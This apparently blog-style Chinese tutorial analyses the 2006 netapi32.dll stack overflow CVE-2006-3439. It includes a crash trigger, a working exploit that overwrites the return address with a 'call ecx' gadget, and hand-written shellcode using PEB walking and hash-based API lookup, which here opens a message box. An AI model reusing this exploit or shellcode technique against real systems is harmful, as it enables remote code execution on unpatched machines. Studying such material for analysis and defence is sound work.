## 前言

 ***本次文章只用于技术讨论，学习，切勿用于非法用途，用于非法用途与本人无关！所有环境均为本地环境分析，且在本机进行学习。**

漏洞是微软2006年爆出的Server服务器栈溢出导致的远程代码执行漏洞，标记为严重，漏洞编号CVE-2006-3439。

这个溢出漏洞发生在netapi32.dll的NetpwPathCanonicalize()函数中，此函数是一个网络路径字符串格式化的函数，函数中wcslen作用是计算字符串长度是以Unicode编码而在栈空间中内容都是以字节作为计算。此文章复现根据榴莲课程讲解与自己研究完成（<http://www.vultop.com/>）。作者：rkabyss

## 一、CVE-2006-3439漏洞原理分析

通过IDA Pro加载netapi32.dll动态链接库，来进行分析CVE-2006-3439漏洞产生的原理。

![1649217006_624d0dee7d2f78d110b5d.png!small?1649217004875](https://image.3001.net/images/20220406/1649217006_624d0dee7d2f78d110b5d.png!small?1649217004875)

通过IDA全局搜索函数功能，直接搜索存在问题的NetpwPathCanonicalize函数，双击进行跳转到NetpwPathCanonicalize函数位置。

![1649217026_624d0e0209357f684d646.png!small?1649217024367](https://image.3001.net/images/20220406/1649217026_624d0e0209357f684d646.png!small?1649217024367)

通过动态分析可以知道漏洞点发生在下图中CALL中。

![1649217045_624d0e153f6bb180c47a2.png!small?1649217043462](https://image.3001.net/images/20220406/1649217045_624d0e153f6bb180c47a2.png!small?1649217043462)

看到在开始sub esp,414h进行开辟栈空间，它是用来存储拼接后的字符串。mov
ebx，411h进行边界检查，查看数据是否溢出。漏洞产生原因主要处在wcslen上，wcslen主要是对字符进行计算，类似于strlen函数，区别在于wcslen计算的是WCHAR类型，在栈空间中内容都是以字节作为计算，用的是ASCII编码，而wcslen使用的是Unicode编码，用的是两个字节，就是同样长度的字符串会少算了一半。前面他检查分411h但是我们可以传入822h字节，这个是十六进制的。

![1649217072_624d0e30a26ed4151d055.png!small?1649217071078](https://image.3001.net/images/20220406/1649217072_624d0e30a26ed4151d055.png!small?1649217071078)

看到cmp ax，5ch他就是动态分析时候进行拼接/。call edi计算path路径的Unicode长度，结果保存到了eax当中，下边add
eax，esi是把两个字符串拼接后大小存到eax当中，第二次边界检查依然是通过0x411进行检查，但是它存在问题。上边prefix不能利用是因为他在外边进行了二次检查，而path是可以利用的，因为没有对他进行检查，以此可以知道path是可以传超长字符串，最长可达411h的二倍。

因为这里检查的还是Unicode编码而不是ASCII编码。运行下边函数他会把path拼接到prefix后面，长度已超过开辟的414h长度，所以造成溢出可以进行利用。

![1649217101_624d0e4d08e666a4e7351.png!small?1649217099320](https://image.3001.net/images/20220406/1649217101_624d0e4d08e666a4e7351.png!small?1649217099320)

##  ** **二、CVE-2006-3439漏洞动态分析****

CVE-2006-3439漏洞有补丁号为KB921883，如果计算机没有打此补丁，此漏洞就可以利用。

    
    
    #include <windows.h>
    typedef void (*MYPROC)(LPTSTR);
    int main()
    {	
    	char path[0x320];
    	char can_path[0x440];
    	int maxbuf=0x440;
    	char prefix[0x100];
    	long pathtype=44;
    	//load vulnerability netapi32.dll which we got from a WIN2K sp4 host  
    	HINSTANCE LibHandle;
    	MYPROC Trigger;
    	char dll[ ] = "./netapi32.dll"; // care for the path 
    	char VulFunc[ ] = "NetpwPathCanonicalize";
    	LibHandle = LoadLibrary(dll);
    	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);
    	memset(path,0,sizeof(path));
    	memset(path,'a',sizeof(path)-2);
    	memset(prefix,0,sizeof(prefix));
    	memset(prefix,'b',sizeof(prefix)-2);
    	//__asm int 3
    	(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
    	FreeLibrary(LibHandle);
    }

此漏洞出现在netapi32.dll动态链接库中，是NetpwPathCanonicalize函数出现了问题，该函数本身是一个网络路径字符串格式化的函数，Unicode编码字符串处理功能。(Trigger)(path,can_path,maxbuf,prefix
,&pathtype,0);首先会先看prefix 参数是不是buffer，如果这个buffer不是空的，那么就把prefix
里面的内容和path路径里的内容通过一个反斜杠连接起来，连接起来会把他们放到can_path里面。

如果prefix
和path越界了或不够大就有可能直接退出。netapi32.dll动态链接库是微软的一个系统库，可以进行远程利用。通过memset对path和prefix进行了初始化，首先初始化成了0在对两个buffer分别用a和b进行覆盖。因为netapi32.dll动态链接库中NetpwPathCanonicalize函数存在问题，所以通过使用GetProcAddress方式拿到他的地址。

运行代码他会直接崩掉，可以看到Offset:
61616161是他的溢出地址，正常溢出不会出现这种地址，61是ASCII中a的编码，所以说返回地址被其中一个buffer给覆盖掉了。

![1649217154_624d0e82c2bd749b63220.png!small?1649217152892](https://image.3001.net/images/20220406/1649217154_624d0e82c2bd749b63220.png!small?1649217152892)

接下来进行动态分析，首先打开生成的Release可执行文件中把NETAPI32.DLL放进去，因为代码中调用NETAPI32.DL是以相对路径调用的。

![1649217175_624d0e9706a719ff201f2.png!small?1649217173132](https://image.3001.net/images/20220406/1649217175_624d0e9706a719ff201f2.png!small?1649217173132)

刚进来他是处在系统模块中，直接F9进入到我们程序当中。

![1649217199_624d0eafa0a8ad5b1510e.png!small?1649217197860](https://image.3001.net/images/20220406/1649217199_624d0eafa0a8ad5b1510e.png!small?1649217197860)

看到0040119F地址call
ms_06_040.401000就是分析程序的主函数。主函数有三个参数，通过特征可以看他调用call之前进行了三次push，他使用的调用约定是stdcall，stdcall参数从右至左的顺序压参数入栈。stdcall和cdecl调用约定都是从右至左的顺序压参数入栈，区别在于stdcall需要通过add进行手动平栈而cdecl由系统平栈。

![1649217224_624d0ec88c42cb4e1008d.png!small?1649217223093](https://image.3001.net/images/20220406/1649217224_624d0ec88c42cb4e1008d.png!small?1649217223093)

此漏洞问题出现在call edx当中。call edx是一个经典的函数指针，因为在编译的时候edx地址还不确定，它是后覆盖进去的。

![1649217260_624d0eec3bb8794209177.png!small?1649217258759](https://image.3001.net/images/20220406/1649217260_624d0eec3bb8794209177.png!small?1649217258759)

直接F8或F9往下走，可以看到它的EBP和EIP都是61616161，说明EBP和EIP都被其中一个buffer给覆盖了。

![1649217289_624d0f09a4ea2582c06b8.png!small?1649217287941](https://image.3001.net/images/20220406/1649217289_624d0f09a4ea2582c06b8.png!small?1649217287941)

因为他call edx，在寄存器中可以看到edx他其实就是有漏洞的API函数。

![1649217309_624d0f1d5305a1f053567.png!small?1649217307606](https://image.3001.net/images/20220406/1649217309_624d0f1d5305a1f053567.png!small?1649217307606)

直接把edx的地址取出来，ctrl+G跳到NetpwPathCanonicalize里去。

![1649217328_624d0f30dd11ab230ea30.png!small?1649217327881](https://image.3001.net/images/20220406/1649217328_624d0f30dd11ab230ea30.png!small?1649217327881)

第一次分析的话就要一步一步往下走，看他在哪一个call下飞了，然后就进去分析那个call，过程不做演示，此次直接定位到问题函数进行分析。

![1649217346_624d0f424edc5171150fd.png!small?1649217344777](https://image.3001.net/images/20220406/1649217346_624d0f424edc5171150fd.png!small?1649217344777)

进入到netapi32.dll中发现sub esp,414，开辟了一块很大的空间。mov edi,dword ptr
ds:[<&wcslen>]计算了一下长度，其实就是做了一个验证。

![1649217365_624d0f55dc438ca413cb0.png!small?1649217365404](https://image.3001.net/images/20220406/1649217365_624d0f55dc438ca413cb0.png!small?1649217365404)

发现它存在&wcscpy和&wcscat，问题就出现在&wcscat上。wcscpy作用是拷贝字符串到栈里面去。

![1649217385_624d0f692343ac4954cea.png!small?1649217383488](https://image.3001.net/images/20220406/1649217385_624d0f692343ac4954cea.png!small?1649217383488)

首先call dword ptr
ds:[<&wcscpy>]进行了call，可以看到他的参数是从eax来的，而eax值是从[ebp-414]来的，我们直接跳到ebp-414。

![1649217401_624d0f797bc364f10549c.png!small?1649217399766](https://image.3001.net/images/20220406/1649217401_624d0f797bc364f10549c.png!small?1649217399766)

通过右键->在内存窗口中转到->转到ebp-414位置。

![1649217416_624d0f889f2b7c1bbe06a.png!small?1649217414759](https://image.3001.net/images/20220406/1649217416_624d0f889f2b7c1bbe06a.png!small?1649217414759)

可以看到内存中一大片62，最后有两个00，这个00是初始化时候故意留的两个，进行了-2操作，有了0000结尾他就是Unicode编码字符串结尾了。

![1649217433_624d0f99e8b691bb78fad.png!small?1649217432328](https://image.3001.net/images/20220406/1649217433_624d0f99e8b691bb78fad.png!small?1649217432328)

单步程序到7517FCCC位置他还没有出现问题。

![1649217448_624d0fa826063b6c3450b.png!small?1649217446459](https://image.3001.net/images/20220406/1649217448_624d0fa826063b6c3450b.png!small?1649217446459)

在执行一步发现0000没有了，其中一个00被5C覆盖了，所以这个就是拼接进去一个/，因为这个拼接进去/，导致00被覆盖，以此这个字符串没有了结尾。

![1649217475_624d0fc3dce29a3bdc450.png!small?1649217474085](https://image.3001.net/images/20220406/1649217475_624d0fc3dce29a3bdc450.png!small?1649217474085)

在此wcscat下边还存有一个wcscat，直接跳转过去。

![1649217503_624d0fdf0a5b79f70f54a.png!small?1649217501453](https://image.3001.net/images/20220406/1649217503_624d0fdf0a5b79f70f54a.png!small?1649217501453)

通过观察内存窗口结尾，目前还是5C00,执行完第二个wcscat他会发生改变。

![1649217533_624d0ffd67028634286a6.png!small?1649217531866](https://image.3001.net/images/20220406/1649217533_624d0ffd67028634286a6.png!small?1649217531866)

可以看到wcscat把a拼接到了后面，而且他没有了0000结束，这个字符串是没有断开的，这么复制过来后就出现了问题。这就是他溢出的一个基本原因。可以看到是61把path路径串给覆盖了。

![1649217560_624d10185f9118aa8181d.png!small?1649217558902](https://image.3001.net/images/20220406/1649217560_624d10185f9118aa8181d.png!small?1649217558902)

通过这个可以知道0012F6A8就是EBP，下边0012F6AC就是返回地址，0012F294为buffer的起始地址。

![1649217604_624d10444abce752c6cd6.png!small?1649217602530](https://image.3001.net/images/20220406/1649217604_624d10444abce752c6cd6.png!small?1649217602530)

在ret结束位置下断点跳转过去，返回地址是0012F6AC，ECX是0012F294为buffer的起始地。所以就可以把prefix或跟path一部分空间直接设置成shellcode。

![1649217629_624d105d4892f8d00c5c0.png!small?1649217627723](https://image.3001.net/images/20220406/1649217629_624d105d4892f8d00c5c0.png!small?1649217627723)

利用immunity debugger工具mona,在命令行输入!mona find -s "\xFF\xD1" -m
netapi32.dll，此命令意思通过mona查找指定指令call
ECS和指定模块netapi32.dll。结果可以看到有很多地址，目前只记0x751852F9和0x7518AE6C两个地址。

![1649217646_624d106e89ed520c75114.png!small?1649217644923](https://image.3001.net/images/20220406/1649217646_624d106e89ed520c75114.png!small?1649217644923)

计算返回地址到起始地址距离，返回地址0012F6AC-0012F294起始地址=0x418 - prefix的100字节 =
0x318，所以就要在0x318的位置上把返回地址进行淹没。

    
    
    #include <windows.h>
    typedef void (*MYPROC)(LPTSTR);
    
    char shellcode[]=
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x6F\x70\x20\x20\x68\x76\x75\x6c\x74\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
    
    int main()
    {	
    	char path[0x320];
    	char can_path[0x440];
    	int maxbuf=0x440;
    	char prefix[0x100];
    	long pathtype=44;
    	//load vulnerability netapi32.dll which we got from a WIN2K sp4 host  
    	HINSTANCE LibHandle;
    	MYPROC Trigger;
    	char dll[ ] = "./netapi32.dll"; // care for the path 
    	char VulFunc[ ] = "NetpwPathCanonicalize";
    	LibHandle = LoadLibrary(dll);
    	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);
    	memset(path,0,sizeof(path));
    	memset(path,0x90,sizeof(path)-2);
    	memset(prefix,0,sizeof(prefix));
    	memset(prefix,'b',sizeof(prefix)-2);
    	memcpy(prefix,shellcode,168);
    	//0x751852F9
    	path[0x318] = 0xF9;
    	path[0x319] = 0x52;
    	path[0x31A] = 0x18;
    	path[0x31B] = 0x75;
    	//__asm int 3
    	(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
    	FreeLibrary(LibHandle);
    }

通过mona已经获取到了两个地址0x751852F9和0x7518AE6C，通过计算算出要覆盖的地址0x318，以字节形式进行赋值把0x751852F9以小端序方式赋给0x318开始到0x31B位置。目前初始化a已经没有意义，进行全部初始化成0x90为not指令，插入一段shellcode通过memcpy(prefix,shellcode,168);命令，意思是把shellcode代码拷贝到prefix中一共是168个字节。

![1649217692_624d109c7289c2438e46c.png!small?1649217690627](https://image.3001.net/images/20220406/1649217692_624d109c7289c2438e46c.png!small?1649217690627)

重新编译完之后再次分析一下，跳到netapi32.dll返回地方可以看到，ESP地址为0x0012F6A8跳转到堆栈，地址是刚才设置的，ECX地址为0x0012F290栈中指向0x0A6A68FC这个就是shellcode的地址。

![1649217728_624d10c0d47205c7774e1.png!small?1649217727251](https://image.3001.net/images/20220406/1649217728_624d10c0d47205c7774e1.png!small?1649217727251)

跳转之后发现发进行call ecx，现在ecx地址就是shellcode的位置。

![1649219639_624d1837ab832f1be9c39.png!small?1649219638138](https://image.3001.net/images/20220406/1649219639_624d1837ab832f1be9c39.png!small?1649219638138)

再次运行跳转到shellcode位置进行了弹窗。

![1649219662_624d184e6447a0fb3036a.png!small?1649219660631](https://image.3001.net/images/20220406/1649219662_624d184e6447a0fb3036a.png!small?1649219660631)

## 三、ShellCode编写

    
    
    void main()
    {
    	_asm{
    		nop
    		nop
    		nop
    		nop
    		nop
    		nop
    		nop
    
    		CLD
    		push 0x1e380a6a
    		push 0x4fd18963
    		push 0x0c917432
    		mov esi,esp
    		lea edi,[esi-0xC]
    		
    		xor ebx,ebx
    		mov bh,0x04
    		sub esp,ebx
    
    		mov bx,0x3233
    		push ebx
    		push 0x72657375
    		push esp
    		xor edx,edx
    
    		mov ebx,fs:[edx + 0x30]
    		mov ecx,[ebx + 0x0c]
    		mov ecx,[ecx + 0x1c]
    		mov ecx,[ecx]
    		mov ebp,[ecx + 0x08]
    
    find_lib_functions:
    		lodsd
    		cmp eax,0x1e380a6a
    		jne find_functions
    		xchg eax,ebp
    		call [edi - 0x8]
    		xchg eax,ebp
    
    find_functions:
    		pushad
    		mov eax,[ebp + 0x3c]
    		mov ecx,[ebp + eax + 0x78]
    		add ecx,ebp
    		mov ebx,[ecx + 0x20]
    		add ebx,ebp
    		xor edi,edi
    
    next_function_loop:
    		inc edi
    		mov esi,[ebx + edi * 4]
    		add esi,ebp
    		cdq
    
    hash_loop:
    		movsx eax,byte ptr[esi]
    		cmp al,ah
    		jz compare_hash
    		ror edx,7
    		add edx,eax
    		inc esi
    		jmp hash_loop
    
    compare_hash:
    		cmp edx,[esp + 0x1c]
    		jnz next_function_loop
    		mov ebx,[ecx + 0x24]
    		add ebx,ebp
    		mov di,[ebx + 2 * edi]
    		mov ebx,[ecx + 0x1c]
    		add ebx,ebp
    		add ebp,[ebx + 4 * edi]
    		xchg eax,ebp
    		pop edi
    		stosd
    		push edi
    		popad
    
    		cmp eax,0x1e380a6a
    		jne find_lib_functions
    
    function_call:
    		xor ebx,ebx
    		push ebx
    		push 0x66666666
    		push 0x66666666
    		mov eax,esp
    		push ebx
    		push eax
    		push eax
    		push ebx
    		call [edi - 0x04]
    		push ebx
    		call [edi - 0x08]
    		nop
    		nop
    		nop
    		nop
    		nop
    		nop
    		nop
    	}
    }

把上边代码生成可执行文件，通过dbg打开找shellcode位置，下图为shellcode地址。![1649219690_624d186a668cf2fd5d260.png!small?1649219688828](https://image.3001.net/images/20220406/1649219690_624d186a668cf2fd5d260.png!small?1649219688828)

进去看到上边写的shellcode进行复制，从cld到结尾带一个not，选择二进制复制。![1649219703_624d1877e2e21e2445886.png!small?1649219702347](https://image.3001.net/images/20220406/1649219703_624d1877e2e21e2445886.png!small?1649219702347)

把复制出来的shellcode二进制以十六进制文本形成粘贴到010Editor，再以C代码形式复制出来。

    
    
    FC 68 6A 0A 38 1E 68 63 89 D1 4F 68 32 74 91 0C 8B F4 8D 7E F4 33 DB B7 04 2B E3 66 BB 33 32 53 68 75 73 65 72 54 33 D2 64 8B 5A 30 8B 4B 0C 8B 49 1C 8B 09 8B 69 08 AD 3D 6A 0A 38 1E 75 05 95 FF 57 F8 95 60 8B 45 3C 8B 4C 05 78 03 CD 8B 59 20 03 DD 33 FF 47 8B 34 BB 03 F5 99 0F BE 06 3A C4 74 08 C1 CA 07 03 D0 46 EB F1 3B 54 24 1C 75 E4 8B 59 24 03 DD 66 8B 3C 7B 8B 59 1C 03 DD 03 2C BB 95 5F AB 57 61 3D 6A 0A 38 1E 75 A9 33 DB 53 68 66 66 66 66 68 66 66 66 66 8B C4 53 50 50 53 FF 57 FC 53 FF 57 F8 90

![1649219720_624d188825edf31995ac7.png!small?1649219718513](https://image.3001.net/images/20220406/1649219720_624d188825edf31995ac7.png!small?1649219718513)

    
    
    unsigned char shellcode[] = {
        0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63, 0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C,0x8B, 0xF4, 0x8D, 0x7E, 0xF4, 0x33, 0xDB, 0xB7, 0x04, 0x2B, 0xE3, 0x66, 0xBB, 0x33, 0x32, 0x53,0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x33, 0xD2, 0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B,0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0x05, 0x95,0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C, 0x8B, 0x4C, 0x05, 0x78, 0x03, 0xCD, 0x8B, 0x59,0x20, 0x03, 0xDD, 0x33, 0xFF, 0x47, 0x8B, 0x34, 0xBB, 0x03, 0xF5, 0x99, 0x0F, 0xBE, 0x06, 0x3A,0xC4, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x03, 0xD0, 0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24, 0x1C, 0x75,0xE4, 0x8B, 0x59, 0x24, 0x03, 0xDD, 0x66, 0x8B, 0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x03, 0xDD, 0x03,0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9, 0x33, 0xDB,0x53, 0x68, 0x66, 0x66, 0x66, 0x66, 0x68, 0x66, 0x66, 0x66, 0x66, 0x8B, 0xC4, 0x53, 0x50, 0x50,0x53, 0xFF, 0x57, 0xFC, 0x53, 0xFF, 0x57, 0xF8, 0x90 
    };

## 四、CVE-2006-3439漏洞远程利用

![1649219736_624d1898c0acabda663ae.png!small?1649219736445](https://image.3001.net/images/20220406/1649219736_624d1898c0acabda663ae.png!small?1649219736445)

受害者

![1649219751_624d18a735514f6522535.png!small?1649219749378](https://image.3001.net/images/20220406/1649219751_624d18a735514f6522535.png!small?1649219749378)

攻击者

![1649219766_624d18b609e89ca090686.png!small?1649219765322](https://image.3001.net/images/20220406/1649219766_624d18b609e89ca090686.png!small?1649219765322)

漏洞利用

![1649219778_624d18c262d459106925b.png!small?1649219777714](https://image.3001.net/images/20220406/1649219778_624d18c262d459106925b.png!small?1649219777714)

![1649219799_624d18d75ed3c4dff9546.png!small?1649219801881](https://image.3001.net/images/20220406/1649219799_624d18d75ed3c4dff9546.png!small?1649219801881)

![1649219818_624d18ea052b5dd8de37d.png!small?1649219818475](https://image.3001.net/images/20220406/1649219818_624d18ea052b5dd8de37d.png!small?1649219818475)

## 五、总结

此次漏洞分析难度不高，因为漏洞时间较久，不过也是比较经典的栈溢出漏洞，适合新手练手，之后也会对二进制漏洞持续更新。

